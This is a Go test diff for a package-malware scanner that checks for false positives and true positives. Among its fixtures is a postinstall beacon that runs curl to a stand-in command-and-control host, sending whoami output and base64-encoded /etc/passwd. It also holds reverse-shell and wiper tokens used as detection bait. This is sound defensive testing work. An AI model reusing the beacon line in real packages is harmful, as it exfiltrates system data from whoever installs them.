@@ -397,6 +397,41 @@ func TestHardcodedWebhookExfil(t *testing.T) {
 	}
 }
 
+func TestPrecisionAtScaleV2FPs(t *testing.T) {
+	npm := verdict.Artifact{Ecosystem: verdict.NPM, Name: "x", Version: "1.0.0"}
+	pypi := verdict.Artifact{Ecosystem: verdict.PyPI, Name: "x", Version: "1.0.0"}
+	// Repeated-octet placeholder IP (validators ships 12.12.12.12 in an example).
+	ip := unpacked(map[string]string{"validators/hostname.py": "EXAMPLE_HOST = '12.12.12.12'  # not a real host"})
+	if hasRule(Analyze(pypi, ip), "hardcoded-ip-endpoint") != nil {
+		t.Fatal("repeated-octet placeholder 12.12.12.12 wrongly flagged as C2")
+	}
+	// reverse-shell / wiper tokens inside a minified bundle are substring
+	// coincidences, not payloads (streamlit, google-adk block on exactly this).
+	minified := unpacked(map[string]string{
+		"static/js/main.A1b2C3d4.js": "var x=" + strings.Repeat("a", 2500) + ";function mkfifo(){}var q='sh -i';var z='mkfs';" + strings.Repeat("b", 2500),
+	})
+	if hasRule(Analyze(npm, minified), "reverse-shell-source") != nil {
+		t.Fatal("minified bundle wrongly flagged as reverse-shell")
+	}
+	// A recon token in a description docstring (passlib: "a hash found in /etc/shadow")
+	// with a homepage URL elsewhere must NOT read as a shell recon beacon.
+	doc := unpacked(map[string]string{
+		"package.json": `{"name":"x","scripts":{"postinstall":"node p.js"}}`,
+		"p.js":         "// verifying a hash found in /etc/shadow, see docs\nconst u='https://example.com/home';\nmodule.exports=u;",
+	})
+	if hasRule(Analyze(npm, doc), "host-recon-exfil") != nil {
+		t.Fatal("/etc/shadow in prose + unrelated URL wrongly flagged as recon exfil")
+	}
+	// But a real beacon — recon INSIDE the fetch command — still fires.
+	beacon := unpacked(map[string]string{
+		"package.json":   `{"name":"x","scripts":{"postinstall":"node p.js"}}`,
+		"p.js":           "require('child_process').exec('curl https://c2.example/$(whoami) -d \"$(cat /etc/passwd|base64)\"');",
+	})
+	if hasRuleSet(Analyze(npm, beacon))["host-recon-exfil"] != verdict.SevHigh {
+		t.Fatal("real curl-recon beacon no longer caught after proximity tightening")
+	}
+}
+
 func TestPySetupExecutionPrecision(t *testing.T) {
 	art := verdict.Artifact{Ecosystem: verdict.PyPI}
 	// Benign setup.py: build subprocess, exec of a version file, a homepage url=
